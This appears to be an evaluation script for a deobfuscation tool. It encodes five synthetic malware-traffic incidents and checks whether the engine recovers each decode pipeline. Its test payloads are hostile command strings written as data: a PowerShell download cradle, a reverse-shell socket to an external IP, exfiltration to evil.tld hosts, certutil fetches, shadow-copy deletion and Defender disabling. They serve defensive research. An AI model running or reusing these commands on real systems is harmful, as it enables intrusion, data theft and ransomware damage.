"""
Success criterion (spec): 3+ incidents with ground truth, depth <=4, N<=15 skills, the critic
must validate in <30 s. We run FIVE synthetic-but-realistic incidents. Each incident has a
known decode pipeline and several malware-flavoured payloads that share it; the analyst's
DEMOS are a few (obfuscated -> revealed) pairs and the QUERY is a held-out payload obfuscated
the same way. We hand the engine only the demos, let it discover the pipeline, then apply the
discovered pipeline to the query and check it against ground truth.

Run:  python eval_incidents.py
"""

import base64
import binascii
import gzip
import time

from deobf import DEFAULT_SKILLS, Critic, discover, execute_pipeline, format_pipeline

# ── encoders = inverse of each decode skill, to BUILD obfuscated traffic ──────

def _xor(data, k):
    return bytes(b ^ k for b in data)


def _enc_stream_cbc(p):           # inverse of the stream_cbc decoder
    c = bytearray(p)
    for i in range(1, len(p)):
        c[i] = p[i] ^ c[i - 1]
    return bytes(c)


ENCODERS = {
    "base64": lambda d, _: base64.b64encode(d),
    "hex": lambda d, _: binascii.hexlify(d),
    "base32": lambda d, _: base64.b32encode(d),
    "gunzip": lambda d, _: gzip.compress(d),
    "xor": lambda d, k: _xor(d, k),
    "add": lambda d, k: bytes((b - k) & 0xFF for b in d),
    "reverse": lambda d, _: d[::-1],
    "stream_cbc": lambda d, _: _enc_stream_cbc(d),
}


def obfuscate(decode_pipeline, revealed: bytes) -> bytes:
    """Apply each decode step's inverse, in reverse order, to forge obfuscated traffic."""
    data = revealed
    for name, param in reversed(decode_pipeline):
        data = ENCODERS[name](data, param)
    return data


# ── five incidents: (label, ground-truth decode pipeline, payload pool) ───────

INCIDENTS = [
    ("Base64+gzip exfil", [("base64", None), ("gunzip", None)], [
        b"GET /upload?host=DC01&data=ZmluYW5jaWFscy54bHN4 HTTP/1.1",
        b"POST /exfil id=4471 file=passwords.kdbx size=20480",
        b"user=jsmith domain=ACME pass=Summer2025! mfa=bypassed",
        b"exfil https://drop.evil.tld/u/9a2f payload=customers.csv",
        b"BEGIN-DUMP table=users rows=18233 cols=email,hash END-DUMP",
    ]),
    ("XOR'd PowerShell loader", [("base64", None), ("xor", 0x5A)], [
        b"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')",
        b"powershell -nop -w hidden -enc JABjAD0ATgBlAHcA...",
        b"Invoke-Mimikatz -DumpCreds; Invoke-WMIExec -Target DC01",
        b"$c=New-Object Net.Sockets.TCPClient('185.34.2.9',4444)",
        b"Start-Process rundll32 evil.dll,EntryPoint -WindowStyle Hidden",
    ]),
    ("Multi-layer C2 beacon", [("hex", None), ("gunzip", None), ("xor", 0x3C)], [
        b"beacon id=7f3a sleep=60 jitter=15 c2=https://cdn.evil.tld/jquery.js",
        b"task=shell cmd=whoami /priv result=SeDebugPrivilege=Enabled",
        b"checkin host=WKS-204 user=admin arch=x64 av=Defender:disabled",
        b"download \\\\share\\tools\\psexec.exe -> C:\\temp\\svc.exe",
        b"keylog window='Outlook' keys='wire transfer 48,000 EUR'",
    ]),
    ("CBC-stream over base32", [("base32", None), ("stream_cbc", None)], [
        b"ransom note: pay 2.5 BTC to bc1qxy2k...  key id=AE19",
        b"encrypt ext=.locked targets=*.docx,*.xlsx,*.pdf threads=8",
        b"shadowcopy delete; bcdedit /set recoveryenabled No",
        b"lateral move smb://10.0.0.0/24 cred=ACME\\svc_backup",
        b"C2 dns tunnel: a1.tunnel.evil.tld TXT q=stage2",
    ]),
    ("Base64 over XOR'd gzip", [("base64", None), ("xor", 0x42), ("gunzip", None)], [
        b"dropper stage2: alloc RWX 0x4000; VirtualProtect; jmp shellcode",
        b"persistence: HKCU\\...\\Run Updater=C:\\Users\\Public\\u.exe",
        b"creds harvested: 132 accounts -> https://collect.evil.tld/v2",
        b"disable: Set-MpPreference -DisableRealtimeMonitoring $true",
        b"reverse shell 91.214.3.7:443 via certutil -urlcache -f",
    ]),
]

N_DEMOS = 4  # the rest of the pool is the held-out query


def run():
    critic = Critic(mode="exact")
    print("=" * 78)
    print(f"  deobf — incident pipeline discovery   (N={len(DEFAULT_SKILLS)} skills, "
          f"depth<=4, exact critic)")
    print("=" * 78)
    print(f"  {'incident':<28}{'discovered pipeline':<34}{'t':>6}  result")
    print("  " + "-" * 74)

    total_t, all_ok = 0.0, True
    for name, truth, pool in INCIDENTS:
        demos = [(obfuscate(truth, p), p) for p in pool[:N_DEMOS]]
        q_revealed = pool[N_DEMOS]
        q_obf = obfuscate(truth, q_revealed)

        t0 = time.time()
        pipeline = discover(demos, DEFAULT_SKILLS, critic, max_depth=4, time_budget=30.0)
        dt = time.time() - t0
        total_t += dt

        decoded = execute_pipeline(pipeline, q_obf) if pipeline is not None else None
        ok = decoded == q_revealed
        all_ok &= ok
        truth_str = format_pipeline(truth)
        got_str = format_pipeline(pipeline)
        verdict = "✓ decoded" if ok else "✗ FAILED"
        exact = "" if got_str == truth_str else f"  (truth: {truth_str})"
        print(f"  {name:<28}{got_str:<34}{dt:>5.2f}s  {verdict}{exact}")

    print("  " + "-" * 74)
    print(f"  total {total_t:.2f}s   "
          f"{'ALL INCIDENTS DECODED ✓' if all_ok else 'some incidents failed ✗'}")
    crit = all_ok and total_t < 30.0
    print("\n" + "=" * 78)
    if crit:
        print("  SUCCESS CRITERION MET: every incident's pipeline recovered from demos and the")
        print("  held-out traffic decoded, well under the 30 s budget. Mechanism is robust")
        print("  enough to move on (LLM-guided proposer / learned critic next).")
    else:
        print("  CRITERION NOT MET — inspect failing incidents above.")
    print("=" * 78)
    return crit


if __name__ == "__main__":
    run()
